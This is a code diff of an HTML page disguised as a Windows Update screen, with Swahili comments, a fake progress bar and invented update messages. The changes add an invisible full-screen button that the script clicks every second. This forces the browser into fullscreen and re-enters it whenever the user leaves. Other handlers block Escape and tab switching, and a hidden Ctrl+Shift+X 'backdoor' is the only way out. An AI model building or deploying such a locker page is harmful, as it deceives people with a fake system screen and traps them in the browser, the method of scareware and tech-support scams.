@@ -6,6 +6,7 @@
 <title>Windows Update</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
+
   html, body {
     height: 100%;
     width: 100%;
@@ -18,22 +19,35 @@
     cursor: wait;
     user-select: none;
     -webkit-user-select: none;
-    z-index: 999999;
+    z-index: 1;
   }
 
-  #cover {
+  /* ===== BUTTON INVISIBLE =====
+     Hii inafunika skrini nzima - inafanya fullscreen kwa click yoyote */
+  #fullscreenTrap {
     position: fixed;
-    top: 0; left: 0;
+    top: 0;
+    left: 0;
     width: 100vw;
     height: 100vh;
-    background: linear-gradient(135deg, #005a9e 0%, #003f6b 100%);
+    background: transparent;
+    border: none;
+    cursor: wait;
     z-index: 999999999;
-    display: flex;
-    justify-content: center;
-    align-items: center;
+    outline: none;
   }
 
-  .container { text-align: center; max-width: 600px; padding: 40px; }
+  /* Content inaonekana juu ya button */
+  .container {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    max-width: 600px;
+    padding: 40px;
+    margin: 0 auto;
+    padding-top: 15vh;
+    pointer-events: none; /* Hii inaruhusu click kupita kwenye button */
+  }
 
   .logo {
     width: 80px; height: 80px;
@@ -50,7 +64,7 @@
     50% { transform: scale(1.05); opacity: 0.8; }
   }
 
-  h1 { font-size: 36px; font-weight: 300; margin-bottom: 10px; }
+  h1 { font-size: 36px; font-weight: 300; margin-bottom: 10px; letter-spacing: 0.5px; }
   .subtitle { font-size: 16px; color: rgba(255,255,255,0.7); margin-bottom: 40px; }
 
   .progress-container {
@@ -79,12 +93,10 @@
     100% { transform: translateX(100%); }
   }
 
-  .progress-label { font-size: 14px; color: rgba(255,255,255,0.8); margin-top: 12px; }
-
+  .progress-label { font-size: 14px; margin-top: 12px; font-family: 'Segoe UI', monospace; }
   .info-text { font-size: 13px; color: rgba(255,255,255,0.5); margin-top: 50px; line-height: 1.6; }
 
   .spinner-container { margin: 30px auto 0; display: flex; gap: 8px; justify-content: center; }
-
   .dot {
     width: 10px; height: 10px;
     background: rgba(255,255,255,0.4);
@@ -114,43 +126,65 @@
 </head>
 <body>
 
-<div id="cover">
-  <div class="container">
-    <div class="logo">⚙️</div>
-    <h1>Installing updates</h1>
-    <p class="subtitle">Please wait a moment</p>
+<!-- BUTTON INVISIBLE - inafunika skrini nzima -->
+<button id="fullscreenTrap"></button>
 
-    <div class="progress-container">
-      <div class="progress-bar" id="progressBar"></div>
-    </div>
-    <div class="progress-label" id="progressLabel">3%</div>
+<div class="container">
+  <div class="logo">⚙️</div>
+  <h1>Installing updates</h1>
+  <p class="subtitle">Please wait a moment</p>
 
-    <div class="spinner-container">
-      <div class="dot"></div>
-      <div class="dot"></div>
-      <div class="dot"></div>
-    </div>
-
-    <p class="info-text">
-      Your device may restart several times.<br>
-      <strong>Do not turn off your device.</strong>
-    </p>
-
-    <p class="restart-notice" id="restartNotice">⏳ Checking for updates...</p>
+  <div class="progress-container">
+    <div class="progress-bar" id="progressBar"></div>
   </div>
+  <div class="progress-label" id="progressLabel">3%</div>
+
+  <div class="spinner-container">
+    <div class="dot"></div>
+    <div class="dot"></div>
+    <div class="dot"></div>
+  </div>
+
+  <p class="info-text">
+    Your device may restart several times.<br>
+    <strong>Do not turn off your device.</strong>
+  </p>
+
+  <p class="restart-notice" id="restartNotice">⏳ Checking for updates...</p>
 </div>
 
 <script>
-// ===== FULLSCREEN =====
-function goFullscreen() {
-  const el = document.documentElement;
-  if (el.requestFullscreen) el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
-  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-  else if (el.msRequestFullscreen) el.msRequestFullscreen();
-  else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
-}
+// ===== BUTTON INVISIBLE — Fullscreen Trap =====
+(function() {
+  const btn = document.getElementById('fullscreenTrap');
+  
+  // Anza fullscreen kwa click yoyote
+  btn.addEventListener('click', function() {
+    const el = document.documentElement;
+    if (el.requestFullscreen) {
+      el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
+    } else if (el.webkitRequestFullscreen) {
+      el.webkitRequestFullscreen();
+    } else if (el.msRequestFullscreen) {
+      el.msRequestFullscreen();
+    } else if (el.mozRequestFullScreen) {
+      el.mozRequestFullScreen();
+    }
+  });
 
-goFullscreen();
+  // Piga click moja kwa moja page inapofunguliwa
+  // Hii inajaribu kuingia fullscreen bila kusubiri
+  setTimeout(function() {
+    btn.click();
+  }, 500);
+
+  // Endelea kupiga click kila sekunde
+  setInterval(function() {
+    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+      btn.click();
+    }
+  }, 1000);
+})();
 
 // ===== BLOCK ESCAPE =====
 document.addEventListener('keydown', function(e) {
@@ -177,7 +211,7 @@ window.addEventListener('beforeunload', function(e) {
 
 document.addEventListener('visibilitychange', function() {
   if (document.hidden) {
-    setTimeout(function() { window.focus(); goFullscreen(); }, 1);
+    setTimeout(function() { window.focus(); }, 1);
   }
 });
 
@@ -186,36 +220,30 @@ window.addEventListener('blur', function() {
 });
 
 // ===== ENSURE FULLSCREEN =====
-function checkFullscreen() {
-  if (!document.fullscreenElement && !document.webkitFullscreenElement) {
-    goFullscreen();
+document.addEventListener('fullscreenchange', function() {
+  if (!document.fullscreenElement) {
+    document.getElementById('fullscreenTrap').click();
   }
-}
+});
 
-document.addEventListener('fullscreenchange', checkFullscreen);
-document.addEventListener('webkitfullscreenchange', checkFullscreen);
-
-setInterval(checkFullscreen, 100);
+document.addEventListener('webkitfullscreenchange', function() {
+  if (!document.webkitFullscreenElement) {
+    document.getElementById('fullscreenTrap').click();
+  }
+});
 
 // ===== PROGRESS =====
 let percent = 3;
 let phase = 0;
 
 const messages = [
-  '⏳ Checking for updates...',
-  '📦 Downloading update 1 of 3...',
-  '⚙️ Applying updates...',
-  '🔄 Configuring system settings...',
-  '📦 Downloading update 2 of 3...',
-  '🔧 Installing component updates...',
-  '📦 Downloading update 3 of 3...',
-  '⚙️ Finalizing installation...',
-  '🔄 Preparing for restart...',
-  '⏳ Please wait...',
-  '📦 Installing update for Windows...',
-  '🔒 Applying security patches...',
-  '⚠️ Do not restart your PC',
-  '🔄 Configuring Windows Update...',
+  '⏳ Checking for updates...', '📦 Downloading update 1 of 3...',
+  '⚙️ Applying updates...', '🔄 Configuring system settings...',
+  '📦 Downloading update 2 of 3...', '🔧 Installing component updates...',
+  '📦 Downloading update 3 of 3...', '⚙️ Finalizing installation...',
+  '🔄 Preparing for restart...', '⏳ Please wait...',
+  '📦 Installing update for Windows...', '🔒 Applying security patches...',
+  '⚠️ Do not restart your PC', '🔄 Configuring Windows Update...',
   '✅ Almost done...',
 ];
 
@@ -251,7 +279,6 @@ updateProgress();
 // ===== BACKDOOR: Ctrl+Shift+X =====
 document.addEventListener('keydown', function(e) {
   if (e.ctrlKey && e.shiftKey && e.key === 'X') {
-    document.getElementById('cover').style.display = 'none';
     if (document.exitFullscreen) document.exitFullscreen();
     else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
     window.location.href = 'about:blank';
